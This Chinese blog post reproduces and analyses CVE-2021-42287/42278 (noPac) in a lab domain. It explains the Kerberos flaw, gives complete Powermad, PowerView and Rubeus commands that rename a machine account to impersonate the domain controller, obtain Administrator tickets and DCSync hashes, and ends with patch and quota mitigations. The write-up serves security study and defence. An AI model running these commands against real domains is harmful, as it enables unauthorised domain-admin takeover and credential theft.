---
title: CVE-2021-42287 漏洞复现及分析
date: 2021-12-18 10:50:34
tags:
---

# CVE-2021-42287 漏洞复现及分析

该漏洞产生的原因是由于AD没有对域内机器账户名做验证，导致绕过安全限制，经过远程身份验证的攻击者可以结合CVE-2021-42278将域内普通用户权限提升到域管理员权限。

## 概述

在域中请求ST（server ticket）票证时，首先需要提供 TGT票据。当 KDC 未找到请求的ST票证时，KDC 会自动再次搜索带有$结尾的用户。

假如域内有一台域控名为 DC（域控对应的机器用户为 DC$），此时攻击者利用漏洞 CVE-2021-42287 创建一个机器用户ZAWX$，再把机器用户ZAWX$的sAMAccountName改成DC。然后利用DC这个账号去申请一个TGT票据。申请完后再将DC的sAMAccountName改为ZAWX$。这个时候KDC就会判断域内没有DC这个用户，自动去搜索DC$（DC$是域内已经的域控DC的sAMAccountName），攻击者利用刚刚申请的TGT进行S4U2self，模拟域内的域管去请求域控DC的ST票据，最终获得域控制器DC的权限。

Privileged Attribute Certificate （PAC） 是 Kerberos 票证的扩展，其中包含有关用户权限的信息。当用户在 AD域中进行身份验证时，域控制器会将此信息添加到 Kerberos 票证中。当用户使用其 Kerberos 票证向其他系统进行身份验证时，可以读取 PAC 并用于确定其权限级别，而无需联系域控制器来查询该信息

## 复现

使用工具：powermad，powerview，rebeus（需要特定版的才会有nopac参数（[GitHub - GhostPack/Rubeus at a2470c0e6a6f9eeadd9c884e73e2f507873ac16f](https://github.com/GhostPack/Rubeus/tree/a2470c0e6a6f9eeadd9c884e73e2f507873ac16f)））

该漏洞的复现要求是需要能够修改一个机器账户的sAMAccountName和servicePrincipalName属性，通常我们可以创建一个机器账户（默认情况下，一个账号可以创建十个机器账户），这时候新机器账户的创建者就有足够的权限来修改账户属性，或者我们可以寻找一个将机器加入域时使用来的账号来进行修改属性。

先利用rubeus的nopac来获取tgt

![image-20211213163335276](/img/image-20211213163335276-4138322.png)

 再利用不带nopac参数来获取tgt

![image-20211213163440540](/img/image-20211213163440540-4138322.png)

发现长度不一样，nopac的长度要短很多，这表示可能存在漏洞。

再通过查询ms-ds-machineaccountquota来判断是否可以新建机器账户。在域外环境中我们可以利用runas /netonly /user:infosec\test cmd来创建一个cmd执行操作。

![image-20211213143704118](/img/image-20211213143704118-4138322.png)

并且检查一下**SeMachineAccountPrivileg**是否默认允许Authenticated Users

![image-20211213164220983](/img/image-20211213164220983-4138322.png)

导入powermad和powerview，利用New-MachineAccount命令来创建一个新的机器账户TestSPN

![image-20211213151725376](/img/image-20211213151725376-4138322.png)

接下来我们利用Set-DomainObject来清楚TestSPN账号中的SPN信息。

![image-20211213152018789](/img/image-20211213152018789-4138322.png)

清楚SPN后，需要将我们TestSPN账号的sAMAccountName修改为域控的机器名，这里我们的域控机器名为DC$，我们就将sAMAccountName修改为DC，修改完后，我们利用DC这个账号去请求TGT。

![image-20211213152240125](/img/image-20211213152240125-4138322.png)

![image-20211213152442697](/img/image-20211213152442697-4138322.png)

请求完后，我们将机器账户的sAMAccountName恢复成原值（修改成其他值也可以）

![image-20211213153120243](/img/image-20211213153120243-4138322.png)

修改完后，我们可以利用获取到的TGT来请求一个S4U2self票据（S4U2self是代表自身请求对其自身的kerberos服务票据），根据漏洞原理，KDC就会判断域内没有DC这个用户时就会去寻找DC$，并获取到一个利用DC$的密钥加密的ST，这里我们获取CIFS服务。

![image-20211213154025689](/img/image-20211213154025689-4138322.png)

klist查看我们获取到的票据，并执行命令验证是否成功。

![image-20211213154129640](/img/image-20211213154129640-4138322.png)

同样，我们可以将CIFS修改为LDAP，这时候我们就可以通过dcsync去获取hash

![image-20211213155427128](/img/image-20211213155427128-4138322.png)

![image-20211213155449786](/img/image-20211213155449786-4138322.png)

```
详细命令
//新建机器账户
New-MachineAccount -MachineAccount TestSPN -Domain infosec.com -DomainController DC.infosec.com -Verbose
//清楚SPN
Set-DomainObject "CN=TestSPN,CN=Computers,DC=infosec,DC=com" -Clear 'servicePrincipalname' -Domain infosec.com -DomainController DC.infosec.com -Verbose
//修改samaccountname
Set-MachineAccountAttribute -MachineAccount TestSPN -Value "DC" -Attribute samaccountname -Domain infosec.com -DomainController DC.infosec.com -Verbose
//获取TGT
Rubeus.exe asktgt /user:infosec\DC /password:123qwe!@# /domain:infosec.com /dc:dc.infosec.com /nowrap
//还原samaccountname
Set-MachineAccountAttribute -MachineAccount TestSPN -Value "TestSPN" -Attribute samaccountname -Domain infosec.com -DomainController DC.infosec.com -Verbose
//利用TGT获取ST
Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:infosec.com b /self /altservice:CIFS/DC.infosec.com /ptt /ticket:[TGT]
```



利用机器账户的另一种方法是对其账户有足够的权限来编辑其sAMAccountName属性（即对该属性的WriteProperty，或GenericWrite，或GenericAll）。
这种攻击路径还需要知道用户账户密码或哈希值（以获得TGT），这可以通过许多方式获得（例如，有针对性的Kerberoasting，影子证书，强制密码更改）。
除了机器账户的创建和SPNs的操作外，利用步骤与机器账户相同。如果账户有指向其名称的SPN，则必须删除这些SPN才能使重命名操作生效。

## 工具利用

sam_the_admin

[GitHub - WazeHell/sam-the-admin: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user](https://github.com/WazeHell/sam-the-admin)

![image-20211213161721419](/img/image-20211213161721419-4138322.png)

## 解决方案

缓解此问题的最佳方法是安装 Microsoft 修补程序 （[KB5008602](https://support.microsoft.com/en-us/topic/november-14-2021-kb5008602-os-build-17763-2305-out-of-band-8583a8a3-ebed-4829-b285-356fb5aaacd7)），此修补程序修复了PAC混淆的问题，并修复了由早期KB5008380修补程序创建的S4U2self的此问题。

将允许创建的机器账户数量设置为**0**是阻止低特权用户创建计算机帐户的快速简便修复方法，另一个相关修复方法是从*SeMachineAccountPrivilege*中删除****Authenticated Users****，并添加*域管理员*或另一组允许的帐户。



